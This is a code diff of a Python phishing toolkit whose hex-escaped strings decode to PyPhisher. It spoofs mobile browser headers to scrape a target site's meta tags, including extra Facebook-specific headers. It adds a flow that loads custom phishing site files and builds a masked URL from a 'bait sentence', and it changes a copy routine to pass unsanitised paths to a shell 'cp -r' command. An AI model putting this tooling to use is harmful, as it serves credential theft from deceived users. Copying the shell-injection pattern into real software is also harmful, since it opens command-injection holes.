@@ -51,6 +51,7 @@ from os import (
     getenv,
     kill,
     listdir,
+    makedirs,
     mkdir,
     mknod,
     popen,
@@ -70,6 +71,7 @@ from os.path import (
 from platform import uname
 from re import search, sub
 from shutil import (
+    copy as cp,
     copy2,
     copyfile,
     copytree,
@@ -160,7 +162,7 @@ lx_help = f"""
 """
 
 packages = [ "php", "ssh" ]
-modules = [ "requests", "bs4", "rich" ]
+modules = [ "requests", "rich" ]
 tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
@@ -196,8 +198,12 @@ for module in modules:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
-from bs4 import BeautifulSoup
-from requests import get, head, Session
+from requests import (
+    get,
+    head,
+    Session
+)
+from requests.exceptions import ConnectionError
 from rich.console import Console
 from rich.panel import Panel
 from rich.progress import (
@@ -303,10 +309,7 @@ ts_commands = {
 
 # Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
 def is_installed(package):
-    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
-    if exit_code == 0:
-        return True
-    return False
+    return bgtask(f"command -v {package}").wait() == 0 # system(f"command -v {package} > /dev/null 2>&1")
 
 
 # Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
@@ -331,7 +334,8 @@ def copy(path1, path2):
     if isdir(path1):
         if isdir(path2):
              rmtree(path2)
-        copytree(path1, path2)
+        #copytree(path1, path2)
+        shell(f"cp -r {path1} {path2}")
     if isfile(path1):
         if isdir(path2):
             copy2(path1, path2)
@@ -416,11 +420,14 @@ def append(text, filename):
 
 def get_meta(url):
     # Facebook requires some additional header
+    headers = {
+        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+    }
     if "facebook" in url:
-        headers = {
+        headers.update({
             "upgrade-insecure-requests": "1",
-            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
             "dnt": "1", 
             "content-type": "application/x-www-form-url-encoded",
             "origin": "https://m.facebook.com",
@@ -430,22 +437,14 @@ def get_meta(url):
             "sec-fetch-user": "empty", 
             "sec-fetch-dest": "document", 
             "sec-ch-ua-platform": "Android",
-            "accept-encoding": "gzip, deflate br", 
-            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
-        }
-    else:
-        headers = {
-            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
-        }
+            "accept-encoding": "gzip, deflate br" 
+        })
     allmeta = ""
     try:
         response = get(url, headers=headers).text
-        soup = BeautifulSoup(response, "html.parser")
-        metas = soup.find_all("meta")
-        if metas is not None and metas!=[]:
-            allmeta = "\n".join([str(meta) for meta in metas])
+        for line in response.split("\n"):
+            if line.strip().startswith("<meta "):
+                allmeta += line + "\n"
     except Exception as e:
         append(e, error_file)
     return allmeta
@@ -579,9 +578,11 @@ def internet(url="https://api.github.com", timeout=5):
         try:
             head(url=url, timeout=timeout)
             break
-        except:
+        except ConnectionError:
             print(f"\n{error}No internet!{nc}\007")
             sleep(2)
+        except Exception as e:
+            print(f"{error}{str(e)}")
 
         
 # Send mail by smtp library
@@ -843,19 +844,27 @@ def shortener3(url):
 def customfol():
     global mask
     while True:
-        fol = input(f"\n{ask}Enter the directory > {green}")
-        if isdir(fol):
-            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
-                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
-                # Remove slash and spaces from mask
-                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
-                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
-                copy(fol, site_dir)
-                return fol
+        has_files = input(f"\n{ask}Do you have custom site files?[y/N/b] > {green}")
+        if has_files == "y":
+            fol = input(f"\n{ask}Enter the directory > {green}")
+            if isdir(fol):
+                if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
+                    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
+                    # Remove slash and spaces from mask
+                    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
+                    delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
+                    copy(fol, site_dir)
+                    return fol
+                else:
+                    sprint(f"\n{error}index.php/index.html is required but not found!")
             else:
-                sprint(f"\n{error}index.php/index.html required but not found!")
+                sprint(f"\n{error}Directory doesn't exist!")
+        elif has_files == "b":
+            main_menu()
         else:
-            sprint(f"\n{error}Directory do not exists!")
+            sprint(f"\n{info}Contact \x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
+            bgtask("xdg-open https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
+            pexit()
 
 # Show saved data from saved file with small decoration
 def saved():
@@ -965,23 +974,25 @@ def updater():
 # Installing packages and downloading tunnelers
 def requirements():
     global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
+    # Termux may not have permission to write in saved_file.
+    # So we check if /sdcard is readable.
+    # If not execute termux-setup-storage to prompt user to allow
     if termux:
-        try:
-            if not isfile(saved_file):
-                mknod(saved_file)
-            with open(saved_file) as checkfile:
-                data = checkfile.read()
-        except:
-            shell("termux-setup-storage")
-        try:
-            if not isfile(saved_file):
-                mknod(saved_file)
-            with open(saved_file) as checkfile:
-                data = checkfile.read()
-        except:
-            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
-            sleep(2)
-            pexit()
+        for retry in range(2):
+            try:
+                if not isfile(saved_file):
+                    mknod(saved_file)
+                with open(saved_file) as checkfile:
+                    data = checkfile.read()
+                break
+            except (PermissionError, OSError):
+                shell("termux-setup-storage")
+            except Exception as e:
+                print(f"{error}{str(e)}")
+            if retry == 1:
+                print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+                sleep(2)
+                pexit()
     internet()
     if termux:
         if not is_installed("proot"):
